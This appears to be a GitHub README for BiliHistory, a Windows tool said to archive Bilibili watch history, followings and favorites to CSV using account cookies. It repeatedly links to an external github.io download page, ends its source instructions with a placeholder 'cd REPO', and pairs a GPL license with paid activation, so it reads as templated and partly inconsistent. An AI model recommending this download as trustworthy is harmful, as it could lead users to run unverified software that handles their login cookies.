# BiliHistory v1.0.0 - Desktop Data Management Tool 2026

> **BiliHistory is a Windows desktop application that uses the official Bilibili API to retrieve watch history, followings, and favorites, then keeps that information locally in searchable CSV files.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alex-carteruva6931/bilihistory-windows-data-tool?style=flat-square)](https://github.com/alex-carteruva6931/bilihistory-windows-data-tool)

---

<p align="center">
  <a href="https://alex-carteruva6931.github.io/bilihistory-windows-data-tool/">
    <img src="https://img.shields.io/badge/Download-BiliHistory%20Latest-brightgreen?style=for-the-badge" alt="Download BiliHistory">
  </a>
</p>

> **[Download BiliHistory v1.0.0](https://alex-carteruva6931.github.io/bilihistory-windows-data-tool/)**

---

[Download Latest Build](https://alex-carteruva6931.github.io/bilihistory-windows-data-tool/)

---

## Overview

BiliHistory gives Bilibili users a desktop-based way to preserve their account activity locally. Through the official API, it gathers viewing history, followed accounts, and favorites, storing the collected information as CSV files on the local computer.

The application is intended for maintaining a personal archive that can grow over time. Each synchronization can create a timestamped snapshot, merge newer records into the existing archive, and remove duplicates. Built-in search, filters, sorting, browsing tools, and local statistics make the saved history practical to inspect without depending on an online history page.

---

## What It Provides

- Uses the official API to obtain Bilibili watch history
- Imports followings and favorites in addition to viewing records
- Keeps synchronized information in local CSV files
- Produces timestamped backups of earlier data states
- Adds new records incrementally while deduplicating repeated entries
- Offers tools for searching, filtering, sorting, and browsing archived records
- Shows locally calculated viewing statistics and trend information
- Accepts cookie-based authentication
- Supports offline activation and includes a 30-day free trial
- Ships as a Windows package, with Linux packaging planned

---

## Installation

### Windows package

1. Get the current Windows package from the [download page](https://alex-carteruva6931.github.io/bilihistory-windows-data-tool/).
2. If the download is archived, extract its contents.
3. Launch BiliHistory from the extracted directory.
4. Follow the prompts to activate the application or begin the trial.

### Running from source

BiliHistory is built with Python and PyQt6. Clone the repository, install dependencies using the included project files, and launch the application through its Python entry point.

```bash
git clone https://github.com/alex-carteruva6931/bilihistory-windows-data-tool.git
cd REPO
```

For users who do not intend to modify or inspect the source, the packaged Windows release is the simpler option.

---

## How to Use BiliHistory

The usual synchronization process is:

1. Launch BiliHistory on Windows.
2. Set up cookie authentication for the Bilibili account whose data you want to access.
3. Choose one or more categories: watch history, followings, or favorites.
4. Run a synchronization using the official API.
5. Let the application merge the returned records into the existing local CSV archive.
6. Explore the archive with search, filtering, sorting, and browsing features.
7. Use the local statistics and trends to review viewing activity.
8. Open timestamped snapshots when comparing or restoring an earlier archive state.

You can also perform manual exports at regular intervals. Incremental updates allow the archive to expand without replacing the entire collection during every synchronization.

---

## Data and Authentication Settings

BiliHistory uses Bilibili cookies for authentication, configured through the application. Collected records and timestamped snapshots remain on the local computer as CSV data.

For reliable archive management:

- Configure authentication before starting a retrieval operation.
- Do not remove the local CSV directory if you want to preserve existing records.
- Retain timestamped snapshots when you need several historical restore points.
- Check activation and trial information through the application's local settings or activation process.

---

## Requirements

- Windows for the currently packaged release
- Python when running the project from source
- PyQt6 for the graphical desktop interface
- Network connectivity for requests to the official Bilibili API
- Valid Bilibili cookies for accessing account-specific data
- Sufficient local storage for CSV archives and timestamped snapshots

Linux packaging is planned and is not currently available as a packaged release.

---

## Frequently Asked Questions

### Which Bilibili data can be retrieved?

BiliHistory can collect watch history, followings, and favorites through the official API.

### Where does BiliHistory keep my records?

The application writes collected records to local CSV files and generates timestamped snapshot backups.

### Will synchronization overwrite my existing archive?

No. BiliHistory supports incremental merging and deduplication, allowing new results to be added to existing records while repeated entries are handled.

### What authentication method is required?

The application uses cookie-based authentication. Add or manage the necessary cookies in BiliHistory before requesting account information.

### Is offline use possible?

Offline activation is available. Retrieving new data still requires access to the official API, but locally stored CSV files, browsing features, and statistics can be used from the desktop application.

### How long can I try BiliHistory?

BiliHistory provides a 30-day free trial. The activation flow displays the relevant activation information.

### What can I check when synchronization fails?

Verify the configured cookies, make sure the computer can reach the network, and confirm that the local storage directory is writable. If the issue remains, check the project issue tracker for current information.

### Does BiliHistory run on Linux?

The available packaged release targets Windows. Linux packaging is planned.

---

## Planned Work

- Continue enhancements to the Windows desktop package
- Develop cross-platform packaging, including planned Linux support
- Improve local archive browsing, statistics, and data management workflows

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
